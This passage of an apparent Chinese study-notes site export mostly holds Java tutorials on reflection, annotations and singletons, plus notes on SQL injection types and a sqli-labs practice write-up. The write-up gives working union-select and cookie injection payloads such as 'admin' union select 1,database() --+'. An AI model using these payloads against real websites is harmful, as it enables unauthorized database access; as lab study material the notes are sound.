student.getSimpleName());\n\n        //    获取类中public修饰的字段Fields\n        Field[] fields = student.getFields();\n        System.out.print(\"\\n\\npublic修饰的字段：\" + fields.length);\n        System.out.print(\"\\n各个public修饰字段名称是：==================\");\n        for (Field f : fields) {\n            System.out.println(f.getName());\n        }\n\n        //    获取所有声明的字段Fields\n        Field[] fields1 = student.getDeclaredFields();\n        System.out.print(\"\\n\\n已经声明的字段个数：\" + fields1.length);\n        System.out.print(\"\\n已经声明的字段===============\");\n        for (Field f : fields1) {\n            System.out.println(f.getName());\n        }\n\n// 更多的方法\n        System.out.println(\"常用方法的使用==========\");\n        for (Field f : fields1) {\n            // 字段修饰符\n            //    获取修饰符标识数字\n            int modifyInt = f.getModifiers();\n            //    转换修饰符数字为本来的字符串，比如public private等等\n            String modifyString = Modifier.toString(modifyInt);\n            System.out.print(modifyString);\n            System.out.print(\" \");\n\n            //    字段返回类型,也就是对象的属性，比如int，Student类\n            Class fieldType = f.getType();\n            System.out.print(fieldType.getSimpleName());//获取简单类名\n            System.out.print(\" \");\n            //    获取字段名称\n            System.out.print(f.getName());\n            System.out.print(\" \");\n            System.out.println();\n        }\n\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%203%201.png)\n\n## 反射机制 反编译 字段\n\n源代码\n\n![Untitled](../../../../assets/Untitled%204%201.png)\n\n```java\nimport com.reflect.test.Student;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Modifier;\n\npublic class Test07 {\n    public static void main(String[] args) throws Exception {\n        // 用来保存代码的内容\n        StringBuilder s = new StringBuilder();\n\n        //    获取类字节码文件\n        Class studentClass = Class.forName(\"com.reflect.test.Student\");\n\n        //    首行的类声明\n        s.append(Modifier.toString(studentClass.getModifiers()) + \" class \" + studentClass.getSimpleName() + \"{\\n\");\n        // 获取各个字段Fields\n        Field[] fields = studentClass.getDeclaredFields();\n        for (Field f : fields\n        ) {\n            s.append(\"\\t\");\n            //                           修饰符                 变量类型           变量名\n            s.append(Modifier.toString(f.getModifiers()) + \" \" +f.getType().getSimpleName()+\" \"+f.getName()+\";\\n\");\n        }\n        s.append(\"}\");\n        System.out.println(s);\n    }\n}\n```\n\n![Untitled](../../../../assets/Untitled%205.png)\n\n## 使用反射机制访问设置字段Field属性\n\n注意：打破封装，可能会留下安全问题，黑客等可能会通过这个制造一些问题\n\n```java\nimport com.reflect.test.Student;\n\nimport java.lang.reflect.Field;\n\npublic class Test09 {\n    public static void main(String[] args)throws Exception {\n//不使用反射机制\nStudent s1=new Student();\n        s1.no=12;//设置属性\nSystem.out.println(s1.no);//访问属性\n//使用反射机制,会增加复杂性，但是能够增加灵活性\n//获取类\nClass c2=Class.forName(\"com.reflect.test.Student\");\n//创建无参构造方法\nObject s3=c2.newInstance();\n//获取no属性字段\nField noField=c2.getDeclaredField(\"no\");\n//给s3对象no字段赋值\nnoField.set(s3,45);\n//获取s3对象nno字段的值\nSystem.out.println(noField.get(s3));\n\n//访问私有属性，无法直接访问，需要打破封装，但是打破封装之后可能会出现安全问题\nField nameField=c2.getDeclaredField(\"name\");\n//打破封装\nnameField.setAccessible(true);\n        nameField.set(s3,\"蔡徐坤\");//赋值\nSystem.out.println(nameField.get(s3));\n\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%206.png)\n\n## 可变长度参数\n\n```java\npublic class Test10 {\n    public static void main(String[] args) {\ndy(\"我\",\"是\",\"大\",\"帅\",\"比\");\ndy2(\"蔡徐坤\",1,23,53,63);\n    }\n    public static void dy(String... strings){\n        for (String s:strings\n             ) {\n            System.out.println(s);\n        }\n    }\n//可变参数只能有一个，而且只能参数括号中的最后一个位置\npublic static void dy2(String s,int... ints){\n        for (int i:ints\n             ) {\n            System.out.println(s+i+\"岁了\");\n        }\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%207.png)\n\n## 反编译方法和字段\n\n原代码\n\n```java\npackage com.reflect.test;\n\npublic class Person {\n    private int age;\n    public  short longs;\n    protected String name;\n    String address;\n\n/**\n     *登录方法\n* @paramname用户名\n* @parampassword密码\n* @return true表示登录成功，false表示登录失败！\n*/\npublic boolean login(String name,String password){\n        if(\"admin\".equals(name) \u0026\u0026 \"123\".equals(password)){\n            return true;\n        }\n        return false;\n    }\n\n//可能还有一个同名login方法\n// java中怎么区分一个方法，依靠方法名和参数列表。\npublic void login(int i){\n\n    }\n\n/**\n     *退出系统的方法\n*/\npublic void logout(){\n        System.out.println(\"系统已经安全退出！\");\n    }\n}\n\n```\n\n```java\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Modifier;\nimport java.lang.reflect.Parameter;\n\npublic class Test11 {\n    public static void main(String[] args) throws Exception {\n        StringBuilder s=new StringBuilder();\n/*类声明 */\nClass aClass=Class.forName(\"com.reflect.test.Person\");\n        String p1= Modifier.toString(aClass.getModifiers());//修饰符\nString c1=aClass.getSimpleName();//获取简单类名\ns.append(p1+\" class \"+c1+\"{\\n\");\n/*获取字段 */\nField[] fields=aClass.getDeclaredFields();\n        for (Field f:fields\n             ) {\n//获取字段修饰符\ns.append(\"\\t\");\n            s.append(Modifier.toString(f.getModifiers()));\n            s.append(\" \");\n//获取字段类型\ns.append(f.getType().getSimpleName());\n            s.append(\" \");\n//获取字段名称\ns.append(f.getName());\n            s.append(\";\\n\");\n        }\n\n/*获取方法 */\nMethod[] methods=aClass.getDeclaredMethods();\n        for (Method m:methods\n             ) {\n//获取方法修饰符\ns.append(\"\\t\");\n            s.append(Modifier.toString(m.getModifiers()));\n            s.append(\" \");\n//获取方法返回值类型\ns.append(m.getReturnType());\n            s.append(\" \");\n//获取方法名称\ns.append(m.getName());\n            s.append(\"(\");\n//获取形参列表\nClass[] parameters=m.getParameterTypes();\n            for (Class c:parameters\n                 ) {\n                s.append(c.getSimpleName());\n                s.append(\",\");\n            }\n            s.deleteCharAt(s.length()-1);//删除因为循环多写的那个逗号\ns.append(\"){}\\n\");//方法体结尾\n}\n\n/*类声明结尾 */\ns.append(\"}\");\n\n        System.out.println(s);\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%208.png)\n\n## 反射机制调用方法\n\n### 书写注意点：\n\n1. 先获取类\n2. 创建对象，在对象或类中查找对应的方法`getDeclaredMethod`\n3. 调用方法对象的方法，`method.invoke(对象名，方法形参…)`\n4. 可以设置一个对象用于接受返回值 `Object o`\n\n源代码\n\n```java\nimport com.reflect.test.Person;\n\nimport java.lang.reflect.Method;\n\npublic class Test12 {\n    public static void main(String[] args) throws Exception{\n/*正常的调用方法 */\n    //创建对象\nPerson p1=new Person();\n//调用方法\nSystem.out.println(p1.login(\"admin\",\"123\")?\"登录成功\":\"登录失败\");\n        p1.logout();\n\n/*采用反射机制调用方法 */\n    //    1.获取类\nClass aClass=Class.forName(\"com.reflect.test.Person\");\n//    2.创建对象\nObject o=aClass.newInstance();//创建无参对象\n//    3.查找方法\nMethod method=aClass.getDeclaredMethod(\"login\", String.class, String.class);//方法名，形参列表所使用的类\n//    4.调用方法\nObject o2=method.invoke(o,\"admin\",\"123\");\n        System.out.println(o2);\n\n//调用另一个方法\nMethod method1=aClass.getDeclaredMethod(\"logout\");\n        method1.invoke(o);\n    }\n}\n\n```\n\n所调用的方法类：\n\n```java\npackage com.reflect.test;\n\npublic class Person {\n    private int age;\n    public  short longs;\n    protected String name;\n    String address;\n\n/**\n     *登录方法\n* @paramname用户名\n* @parampassword密码\n* @return true表示登录成功，false表示登录失败！\n*/\npublic boolean login(String name,String password){\n        if(\"admin\".equals(name) \u0026\u0026 \"123\".equals(password)){\n            return true;\n        }\n        return false;\n    }\n\n//可能还有一个同名login方法\n// java中怎么区分一个方法，依靠方法名和参数列表。\npublic void login(int i){\n\n    }\n\n/**\n     *退出系统的方法\n*/\npublic void logout(){\n        System.out.println(\"系统已经安全退出！\");\n    }\n}\n\n```\n\n## 反射机制调用构造方法\n\n```java\nimport com.reflect.test.Vip;\n\nimport java.lang.reflect.Constructor;\n\npublic class Test14 {\n    public static void main(String[] args) throws Exception {\n//一般调用构造方法\nVip v1=new Vip(12,\"张三\");\n        System.out.println(v1);\n\n//采用反射机制调用构造方法\n//获取类\nClass aClass=Class.forName(\"com.reflect.test.Vip\");\n//调用无参构造方法\nObject o1=aClass.newInstance();\n\n//调用有参构造方法\n//获取构造方法\nConstructor c1=aClass.getDeclaredConstructor(int.class,String.class);\n//采用有参构造方法创建对象\nObject o2=c1.newInstance(125,\"王麻子\");\n        System.out.println(o2);\n        Constructor c2=aClass.getDeclaredConstructor(int.class,String.class,String.class,boolean.class);\n        Object o3=c2.newInstance(45,\"蔡徐坤\",\"2001年8月8日\",true);\n        System.out.println(o3);\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%209.png)\n\n```java\npackage com.reflect.test;\n\npublic class Vip {\n    int no;\n    String name;\n    String birth;\n    boolean sex;\n\n    public Vip() {\n    }\n\n    public Vip(int no) {\n        this.no = no;\n    }\n\n    public Vip(int no, String name) {\n        this.no = no;\n        this.name = name;\n    }\n\n    public Vip(int no, String name, String birth) {\n        this.no = no;\n        this.name = name;\n        this.birth = birth;\n    }\n\n    public Vip(int no, String name, String birth, boolean sex) {\n        this.no = no;\n        this.name = name;\n        this.birth = birth;\n        this.sex = sex;\n    }\n\n    @Override\n    public String toString() {\n        return \"Vip{\" +\n                \"no=\" + no +\n                \", name='\" + name + '\\'' +\n                \", birth='\" + birth + '\\'' +\n                \", sex=\" + sex +\n                '}';\n    }\n}\n\n```\n\n## 获取父类和接口\n\n```java\npublic class Test15 {\n    public static void main(String[] args)throws Exception {\n//获取类\nClass c=Class.forName(\"java.lang.String\");\n//获取父类\nClass superclass=c.getSuperclass();\n        System.out.println(superclass);\n//获取父接口\nClass[] interfaces=c.getInterfaces();\n        for (Class cname:interfaces\n             ) {\n            System.out.println(cname.getName());\n        }\n    }\n}\n\n```\n\n![Untitled](../../../../assets/Untitled%2010.png)","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/2802_%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E8%A1%A5%E5%85%85":{"title":"2802_反射机制补充","content":"# 2802_反射机制补充\n## 反射机制的作用\n1. 可以获取类文件（直接操作字节码文件）\n2. 可以破坏封装性（**打破封装**）\n3. 可以**破坏泛型的约束**（因为泛型只是在编译阶段出现异常，编译之后的字节码文件是不存在泛型的，所以可以通过直接操作字节码文件，来达到绕过泛型约束的作用）\n4. 更适合于做Java高级框架\n\n### 采用反射机制 保存对象的所有成员变量值\n```java\npackage reflectTest;  \n  \nimport java.io.File;  \nimport java.io.FileOutputStream;  \nimport java.io.PrintStream;  \nimport java.lang.reflect.Field;  \n  \npublic class MybatisUtil {  \n    /**  \n     * 保存所有类型的对象  \n     *  \n     * @param obj obj  \n     */    public static void save(Object obj) {  \n        try (PrintStream ps = new PrintStream(new FileOutputStream(\"D:\\\\StudyHuigu\\\\reflectTest\\\\src\\\\reflectTest\\\\data.txt\",true));  \n        ) {  \n        //    1.提取对象的类  \n            Class c=obj.getClass();  \n            ps.println(\"========\"+c.getSuperclass()+\"====================\");  \n  \n        //    2.提取全部成员变量  \n            Field[] fields=c.getDeclaredFields();  \n        //    3.获取成员变量的信息  \n            for (Field field:fields){  \n                String name=field.getName();  \n            //    提取成员变量在obj对象中的取值  \n                field.setAccessible(true);//打破封装  \n                String value=field.get(obj).toString();  \n                ps.println(name+\"=\"+value);  \n            }  \n  \n        //  \n        }catch (Exception e){  \n            e.printStackTrace();  \n        }  \n    }  \n}\n```\n\n测试方法，student以及teacher类就忽略了\n```java\npackage reflectTest;  \n  \n/**  \n * 反映演示 提供一个通用框架，保存所有对象的具体信息  \n *  \n * @author 22305 * @date 2022/09/30 */public class ReflectDemo {  \n    public static void main(String[] args) {  \n        Student s=new Student(\"猪八戒\",'男',12,\"西天取经班\",\"吃饭\");  \n    //    调用采用反射机制的save方法保存对象的所有成员变量值  \n        MybatisUtil.save(s);  \n  \n        Teacher t=new Teacher(\"张老师\",'女',8545.02);  \n    //    保存对象成员变量值  \n        MybatisUtil.save(t);  \n    }  \n  \n}\n```\n测试结果output：通过反射机制，将生成的两个对象的成员变量值都写入到了data.txt文件中\n![](../../../../assets/Pasted%20image%2020220930161758.png)","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/3.1SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B":{"title":"3.1SQL注入之数据类型","content":"\n\n# SQL注入之数据类型\n\n### （1）数字型注入点\n\n许多网页链接有类似的结构 [http://xxx.com/users.php?id=1](http://xxx.com/users.php?id=1) 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 `select * from 表名 where id=1` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where id=1 and 1=1`\n\n### （2）字符型注入点\n\n网页链接有类似的结构 [http://xxx.com/users.php?name=admin](http://xxx.com/users.php?name=admin) 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where name='admin' and 1=1 '` 我们需要将这些烦人的引号给处理掉。\n\n### （3）搜索型注入点\n\n这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `\"keyword=关键字\"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`\n\n### (4) xx型注入点\n\n其他型：也就是由于SQL语句拼接方式不同，在SQL中的实际语句为：，其本质为（xx') or 1=1 # ）\n\n常见的闭合符号：'     ''    %     (      {\n","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/3.2SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F":{"title":"3.2SQL注入之提交方式","content":"\n\n# SQL注入之数据提交方式\n\n### GET方式注入\n\nget注入方式比较常见，主要是通过url中传输数据到后台，带入到数据库中去执行，可利用联合注入方式直接注入\n\n### POST方式注入\n\npost提交方式主要适用于表单的提交，用于登录框的注入\n\n方法：利用BurpSuite抓包进行重放修改内容进行，和get差别是需要借助抓包工具进行测试，返回结果主要为代码，也可转化为网页显示\n\n### Request方式注入\n\n概念：超全局变量 PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可以用，这些超全局变量是：\n$_REQUEST（获取GET/POST/COOKIE）COOKIE在新版本已经无法获取了\n$_POST（获取POST传参）\n$_GET（获取GET传参）\n$_COOKIE（获取COOKIE传参）\n$_SERVER（包含了诸如头部信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）\n\n### HTTP头注入\n\n什么是Header头？\n\n通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机响应消息。 这两种类型的消息有一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。 HTTP的头域包括通用头，请求头，响应头和实体头四个部分\n\n### 什么是Header头部注入？\n\nheader注入，该注入是指利用后端验证客户端信息（比如常用的cookie验证）或者通过header中获取客户端的一些信息（比如User-Agent用户代理等其他header字段信息），因为这些信息在某些地方是会和其他信息一起存储到数据库中，然后再在前台显示出来，又因为后台没有经过相对应的信息处理所以构成了sql注入。\n","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/3.3SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E6%A1%88%E4%BE%8B%E7%BB%83%E4%B9%A0":{"title":"3.3SQL注入靶场案例练习","content":"\n\n# SQL注入靶场案例练习\n### Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/248050e80cb94ba4819ece5c9a45072d.png)\n\n**用burpsuit，抓包修改参数**\n\n![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/5a2399e3e7a0467abd0dab8e36ad9550.png)\n\n联合查询union select测试payload\n\nuname=admin' union select 1,2  --+\u0026passwd=admin\u0026submit=Submit\n\n爆库payload\n\nuname=admin' union select 1,database() --+\u0026passwd=admin\u0026submit=Submit\n- ### **Less-20** POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)\n  \n  单引号，报错型，cookie型注入。\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/5f681aa84f7144c5aa6471c997b61896.png)\n  \n  存在魔术引号\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/7970543bbc6a4225a7479a1e73d412c1.png)\n  \n  直接cookie注入，进行绕过\n  \n  Cookie: uname=-admin' union select 1,2,database()--+\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645703752000/4240a5acf9ed49ac8326cdd95dc252d7.png){:height 401, :width 734}","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/3101_%E6%B3%A8%E8%A7%A3":{"title":"3101_注解","content":"# 3101_注解\n\n\nCreated: August 10, 2022 8:13 PM\n\n\u003e[!faq]+ 作用\n\u003e 对Java中类、方法、成员变量做标记，进行特殊处理\n\n## 基本\n\n注解，或者叫做注释类型，英文单词是：Annotation\n\n注解Annotation是一种引用数据类型。编译之后也是生成xxx.class文\n\n## 定义\n\n```java\n[修饰符列表] @interface 注解名{\n\tpublic 属性类型 属性名() default 默认值;\n\t\t }\n```\n\n# 总结\n\n1. 有且只有value属性，可以直接写属性值\n2. 设置了default默认值的属性，使用时可以不写属性值，其他属性全都需要写 属性=属性值\n3. 注解的属性可以是  byte short int long float double boolean char String Class 枚举类型 以及以上每一种的数组形式。\n\n### 使用：\n\n1. 注解的使用格式是\n    \n    ```java\n    @注解类型名\n    ```\n    \n2. 注解可以出现在类上、属性上、方法上、变量上等....注解还可以出现在注解类型上。\n\n### 内置的注解\n\n`java.lang`包下的注解\n\n`Deprecated` 注解的程序元素，**不建议使用**，**已过时。** 通常是因为它很危险或存在更好的选择。（使用的上班，**会在编辑器上有删除线**）\n\n`Override` 表示一个方法声明，**重写父类方法**\n\n```\n@Override这个注解是给编译器参考的，和运行阶段没有关系。\n//凡是java中的方法带有这个注解的，编译器都会进行编译检查，如果这个方法不是重写父类的方法，编译器报错。\n```\n\n`SuppressWarnings` 指示应该在注释元素（以及包含在该注释元素中的所有程序元素）中**取消显示指定的编译器警告**\n\n# 元注解\n\n用来标注“注解类型”的“注解”，称为元注解。\n\n常见的元注解：\n\n1. `Target`\n    1. 这个`Target`注解用来标注“**被标注的注解”可以出现在哪些位置**\n    2. `@Target(ElementType.METHOD)`：表示“被标注的注解”**只能出现在方法上**。\n    3. `@Target(value={CONSTRUCTOR, FIELD, LOCAL_VARIABLE, METHOD, PACKAGE, MODULE, PARAMETER, TYPE})`   表示该注解可以出现在：构造方法上 字段上 局部变量上 方法上....类上...\n2. `Retention` 用来标注“**被标注的注解”最终保存在哪里。**\n    1. `@Retention(RetentionPolicy.**SOURCE**)`：表示该注解只被保留在**java源文件**中。\n    2. `@Retention(RetentionPolicy.**CLASS**)`：表示该注解被保存在**class文件**中。\n    3. `@Retention(RetentionPolicy.**RUNTIME**)`：表示该注解**被保存在class文件中，并且可以被反射**机制所读取。\n\n### 注解在开发中的作用\n\n假设有这样一个注解，叫做：@Id\n\n这个注解只能出现在类上面，当这个类上有这个注解的时候，要求这个类中必须有一个int类型的id属性。如果没有这个属性就报异常。如果有这个属性则正常执行！\n\n### Deprecated\n\n![Untitled](../assets/b30e9da49c354b0cbd0d7dabbc9859d2.png)\n\n## eg1 注解属性以及默认值\n\n指明了属性，除了默认值属性，在使用的时候，其他未设置默认值的属性必须赋值（属性名=属性值，中间使用逗号隔开）\n\n**注意使用的时候，最后面没有`；`结束符号** \n\n注解代码\n\n```java\npackage Annotation;\n\npublic @interface MyAnnotation {\n//给注解设置属性，在使用的时候，必须指明 属性=属性名，否则会报错，无非其都设置了默认值\nString name();\n\n/*\n颜色属性\n     */\nString color();\n\n/*\n年龄属性\n     */\nint age() default 25;\n}\n\n```\n\n使用\n\n```java\npackage Annotation;\n\npublic class Test01 {\n    @MyAnnotation(name=\"张三\",color=\"红色\")\n    public void doSome(){\n\n    }\n\n    public static void main(String[] args) {\n\n    }\n}\n\n```\n\n## eg2 有且只有一个value属性值，value= 可以省略，直接写属性值\n\n注解\n\n```java\npackage Annotation02;\n\npublic @interface MyAnnotation {\n    int value();\n}\n\n```\n\n使用\n\n```java\npackage Annotation02;\n\npublic class Test {\n    @MyAnnotation(value=12)\n    public void doSome(){    }\n\n//value属性前面的 value=可以省略，其他属性不可以\n@MyAnnotation(12)\n    public void doSoem01(){   }\n}\n\n```\n\n## eg3 数组属性值\n\n数组属性值只有一个，可以省略大括号\n\n```\npackage Annotation04;\n//注解\npublic @interface MyAnnotation {\n    String name() default \"张三\";\n    String[] color();\n    JIJIE jijie();\n}\n//季节枚举\nenum JIJIE{\nCHUN,XIA,QIU,Dong\n}\n//使用\nclass Test{\n    @MyAnnotation(color ={\"yellow\",\"red\",\"green\"},jijie = JIJIE.CHUN)\n    public void Test01(){    }\n\n    @MyAnnotation(jijie = JIJIE.Dong,color = \"white\")//数组属性值只有一个可以省略大括号\npublic void Test02(){}\n}\n```\n\n## eg4 元注解的使用\n\n```java\npackage Annotation05;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n//希望注解只能在类和方法上使用\n@Target({ElementType.TYPE,ElementType.METHOD})\n//希望注解可以被反射\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Annotation {\n    String value() default \"上海\";\n}\n\n```\n\n```java\npackage Annotation05;\n\npublic class Test01 {\n    @Annotation(\"南京\")\n    public void some1(){}\n\n//value设置了默认值，可以不赋值\n@Annotation\n    public void  some2(){}\n}\n\n```\n\n## eg5 反射机制的使用\n\n源代码\n\n```java\npackage Annotation05;\n\nimport java.lang.reflect.Field;\n\npublic class Test02 {\n    public static void main(String[] args) throws Exception {\n//创建类\nClass aClass=Class.forName(\"Annotation05.Test01\");\n//查看类上是否是否有Annotation这个注解\nSystem.out.println(aClass.isAnnotationPresent(Annotation.class));//true\n    //获取类对象\nif (aClass.isAnnotationPresent(Annotation.class)){\n//获取注解对象\nAnnotation annotation=(Annotation)aClass.getAnnotation(Annotation.class);\n            System.out.println(\"注解对象:\"+annotation);\n//获取注解对象的值\nString s=annotation.value();\n            System.out.println(s);\n        }\n\n    }\n}\n\n```\n\n测试类\n\n```java\npackage Annotation05;\n@Annotation(\"上海浦东区\")\npublic class Test01 {\n\n//@MyAnnotation\nint i;\n\n//@MyAnnotation\npublic Test01(){\n    }\n\n    @Annotation\n    public void doSome(){\n\n//@MyAnnotation\nint i;\n    }\n\n}\n\n```\n\n注解类\n\n```java\npackage Annotation05;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n//希望注解只能在类和方法上使用\n@Target({ElementType.TYPE,ElementType.METHOD})\n//希望注解可以被反射\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Annotation {\n    String value() default \"上海\";\n}\n\n```\n\n## eg6 注解在开发中的作用\n\n测试类\n\n```java\npackage Annotation07;\n\nimport java.lang.reflect.Field;\n\npublic class Test01 {\n    public static void main(String[] args) throws Exception {\n        // 获取类\n        Class c = Class.forName(\"Annotation07.User\");\n        //    获取字段\n        Field[] fields = c.getDeclaredFields();\n        boolean isOk=false;//是否合法的标记\n        for (Field f : fields\n        ) {\n            //   是否有int类型的id字段\n            if (\"int\".equals(f.getType().getSimpleName()) \u0026\u0026 \"id\".equals(f.getName())){\n                isOk=true;\n                break;//跳出循环\n            }\n        }\n        //如果不合法，就抛出异常\n        if (!isOk){\n            throw new BuhefaException(\"没有包含int id字段的不合法异常\");\n        }\n    }\n\n    public void doSome() {\n    }\n}\n```\n\n异常类\n\n```java\npackage Annotation07;\n\npublic class BuhefaException extends  RuntimeException {\n    public BuhefaException() {\n    }\n\n    public BuhefaException(String message) {\n        super(message);\n    }\n}\n\n```\n\n注解类\n\n```java\npackage Annotation07;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n@Target(ElementType.METHOD)//只能在方法中使用\n@Retention(RetentionPolicy.RUNTIME)//可以反射\npublic @interface IdAnnotation {\n\n}\n\n```\n\n用户类\n\n```java\npackage Annotation07;\n\npublic class User {\n    int age;\n    String name;\n    String pass;\n}\n\n```\n\n结果\n\n开头只有int 的age字段，不满足条件\n\n![Untitled](../assets/b71528fa496c45d4a397d043c9e93761.png)\n\n增加int id字段后，无异常\n\n![Untitled](../../../../assets/Untitled%202.png)","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/3102_%E6%B3%A8%E8%A7%A3%E8%A1%A5%E5%85%85":{"title":"3102_注解补充","content":"# 3102_注解补充\n\n\u003e![faq]+ 解析注解的技巧\n\u003e注解在哪个成分上，就拿哪个成分对象\n\u003e\t比如注解作用于成员方法，就获取成员方法对应的method对象，再拿注解\n\n\n### 注解解析案例 eg1\n题目\n\n![](../../../../assets/Pasted%20image%2020220930171157.png)\n\n代码\n```java\npackage annotationTest;  \n  \nimport org.junit.Test;  \n  \nimport java.lang.annotation.*;  \nimport java.lang.reflect.Method;  \nimport java.util.Arrays;  \n  \n@Target({ElementType.TYPE,ElementType.METHOD})  \n@Retention(RetentionPolicy.RUNTIME)  \n@interface Book {  \n    String value();  \n    double price() default 100;  \n    String[]  author();  \n}  \n  \n@Book(value = \"《本草纲目》\",price = 45,author = {\"李时珍\"})  \nclass BookStore{  \n    @Book(value = \"《龙族》\",price = 65,author = {\"江南\",\"jiangnan\"})  \n    public void test(){  \n    }  \n}  \n  \npublic class AnnotationTest{  \n    @Test  \n    public void parseClass(){  \n    //    1.先得到BookStore的成分对象  \n        Class c=BookStore.class;  \n  \n    //    2.判断是否存在这个注解  \n        if (c.isAnnotationPresent(Book.class)){  \n        //    3.获取该注解对象  \n            System.out.println(\"类的注解解析\");  \n            Book book=(Book)c.getDeclaredAnnotation(Book.class);  \n            System.out.println(book.value()+\"\\t\"+book.price()+\"\\t\"+ Arrays.toString(book.author()));  \n        }  \n    }  \n  \n    @Test  \n    public void parseMethod() throws NoSuchMethodException {  \n    //    1.得到成分  \n        Method m=(BookStore.class).getDeclaredMethod(\"test\");  \n    //    判断是否存在这个注解  \n        if (m.isAnnotationPresent(Book.class)){  \n            System.out.println(\"方法的注解解析\");  \n            Book book=(Book) m.getDeclaredAnnotation(Book.class);  \n            System.out.println(book.value()+\"\\t\"+book.price()+\"\\t\"+ Arrays.toString(book.author()));  \n        }  \n    }  \n}\n```\n\n测试 输出结果\n```\n类的注解解析\n《本草纲目》\t45.0\t[李时珍]\n```\n\n```\n方法的注解解析\n《龙族》\t65.0\t[江南, jiangnan]\n\n```\n\n 模拟Junit框架\n[[3301_单元测试]]\n","lastmodified":"2023-05-31T09:03:32.973907161Z","tags":null},"/3201_%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%A1%A5%E5%85%85":{"title":"3201_单例设计模式【补充】","content":"# 3201_单例设计模式【补充】\n\n单例必须将构造器私有化\n\n单例：只需要一个对象即可\n\n## 饿汉单例模式\n\n使用情况：\n\n在用类获取对象的时候，对象已经提前为你创建好了（**提前创建所需要的对象**）\n\n### 设计步骤\n\n1.  定义一个类，构造器私有化\n2.  定义一个静态变量存储这个new的类的对象\n\n```java\n/** a、定义一个单例类 */\npublic class SingleInstance {\n    /** c.定义一个静态变量存储一个对象即可 :属于类，与类一起加载一次 */\n    public static SingleInstance instance = new SingleInstance ();\n\n    /** b.单例必须私有构造器*/\n    private SingleInstance (){\n        System.out.println(\"创建了一个对象\");\n    }\n}\n\n```\n\n## 懒汉单例模式\n\n使用情况：\n\n在需要的时候对象的时候才去创建这个对象（**延迟加载对象**）\n\n### 设计步骤\n\n1.  定义一个类，构造器私有化\n2.  定义一个静态变量存储一个变量\n3.  定义一个返回单例的public方法\n\n```java\nclass Singleton02{\n    //  b.定义一个静态变量存储一个对象(这里不能创建对象，需要的时候才创建，这里只是一个变量用于存储对象！)\n    public static Singleton02  instance ;\n\n    //   a.定义一个类，把构造器私有。\n    private Singleton02(){\n\n    }\n    //  c.提供一个返回单例对象的方法。\n    public static Singleton02 getInstance(){\n        if(instance == null){\n            // 第一次来拿单例对象！需要创建一次对象，以后直接返回！！\n            instance = new Singleton02();\n        }\n        return instance;\n    }\n}\n```","lastmodified":"2023-05-31T09:03:32.977907197Z","tags":null},"/3202_Calendar%E6%97%A5%E5%8E%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E8%A1%A5%E5%85%85":{"title":"3202_Calendar日历类使用【补充】","content":"# 3202_Calendar日历类使用【补充】\n\n---\n注意，calendar不能直接new对象，需要通过懒汉单例\n\n```java\npackage test;\n\nimport sun.security.util.AuthResources_it;\n\nimport 